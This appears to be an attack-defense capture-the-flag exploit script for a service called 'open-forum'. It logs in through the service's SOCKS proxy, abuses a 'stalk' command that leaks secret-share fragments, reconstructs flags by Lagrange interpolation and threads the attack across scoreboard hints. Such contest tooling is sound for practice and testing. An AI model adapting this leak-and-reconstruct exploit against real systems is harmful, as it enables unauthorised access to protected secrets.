#!/usr/bin/env python3

"""
exploit script used to stresstest the service by continually exploiting the service

due to high cpu usage on the test vms, this script needs to be run locally.
"""

import json
import requests
import base64
import sharing
import sys
import threading
import traceback
import string
import random
import time
from python_socks.async_.asyncio import Proxy
import asyncio
import httpx
import re

from typing import Optional, Tuple, Union, List

#asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

TARGET2 = sys.argv[1] # The target's ip address is passed as an command line argument
TARGET = "127.0.0.1"
service = "open-forum"

MSG_REGEX = re.compile(r"^(\d*)\(([a-zA-Z0-9-+=\/]*)\):(.*)$")
ONE_FLAG_REGEX = re.compile(r"ONE\{([-A-Za-z0-9+/=]*)\}")
P = 0x100000000000000000000000000000000000000000000000000000000000000000000007F



def decode_or_mumble(byt: bytes, message: str = "not a utf-8 string") -> str:
    try:
        return byt.decode(encoding="utf-8")
    except ValueError:
        raise Exception(message)

def decomp_msg(msg: str) -> Tuple[int, str, str]:
    match = re.fullmatch(MSG_REGEX, msg)
    if match is None:
        raise Exception("message syntax broken")
    id, username, content = match.groups()  # type: ignore
    try:
        id = int(id)
    except ValueError:
        raise Exception("message id is NaN")
    return id, username, content


def grep(needle: Union[re.Pattern, str], haystack: List[str]) -> List[str]:
    res = []
    for line in haystack:
        if (needle in line):
            res.append(line)
    return res

async def exp(thread_id):
    rq = httpx.AsyncClient(base_url=f"http://{TARGET}:9145")
    username: str = "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )
    password: str = "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )
    await rq.post("/", data={"username":username, "password": password})
    proxy = Proxy.from_url(f"socks5://{username}:{password}@{TARGET}:1080", rdns=True)
    sock = await proxy.connect(service, 1337)
    rd, wr = await asyncio.open_connection(
        host=None,
        port=None,
        sock=sock,
    )
    await rd.readuntil(b"\n>")
    wr.write(f"stalk {thread_id}\n".encode())
    await wr.drain()
    res = await rd.readuntil(b"\n>")

    res = decode_or_mumble(res).splitlines()

    res = [decomp_msg(msg) for msg in grep(thread_id, res)]
    if len(res) == 0:
        raise Exception("no msg found")

    xs = list(
        map(
            lambda x: (
                x[0],
                int.from_bytes(
                    base64.b64decode(re.search(ONE_FLAG_REGEX, x[2]).group(1)),
                    "big",
                ),
            ),
            res,
        )
    )
    test = sharing.lagrange2(xs, P)
    flag = "ENO" + base64.b64encode(test.to_bytes(36, "big")).decode(
        encoding="utf-8"
    )
    #print(data.decode())
    print(flag)

def exploit(hint: Optional[str], flag_store: Optional[int]):
    print(f'Attacking {TARGET} (flag_store={flag_store}, hint={hint})')
    store = int(flag_store)
    if store == 1 or store == 3:
        #print("one")
        asyncio.run(exp(hint))


# Some CTFs publish information ('flag hints') which help you getting individual flags (e.g. the usernames of users that deposited flags).

# Bambi CTF / ENOWARS flag hints:
attack_info = requests.get('http://10.0.13.37:5001/scoreboard/attack.json').json()
#attack_info = requests.get('http://192.168.1.0:5001/scoreboard/attack.json').json()
service_info = attack_info['services']['onlyflags']
team_info = service_info[TARGET2] # Get the information for the current target
threads = []
for round_nr in team_info:
    round_info = team_info[round_nr]
    for flag_store in round_info:
        store_info = round_info[flag_store]
        for flag_info in store_info:
            # flag_info will always be a string, which you might have to parse with json.loads
            t = threading.Thread(target=exploit, args=(flag_info, flag_store))
            t.start()
            threads.append(t)
for thread in threads:
    try:
        thread.join()
    except Exception as e:
        print(e)

# In CTFs that do not publish flag hints you are on your own.
#exploit(None, None)



# Bambixsploit can automatically submit flags to the Bambi CTF / ENOWARS flag submission endpoints only, for other CTFs you have to do it yourself.
'''
# RuCTF / STAY ~ CTF submission
SUBMISSION_ADDRESS = 'http://monitor.ructfe.org/flags'
def submit(flag: str):
    headers={'X-Team-Token': 'TODO_INSERT_SECRET_TOKEN_HERE'}
    data='['+flag+']'
    response = requests.put(SUBMISSION_ADDRESS, headers=headers, data=data)
    print(response)
    print(response.content)
'''

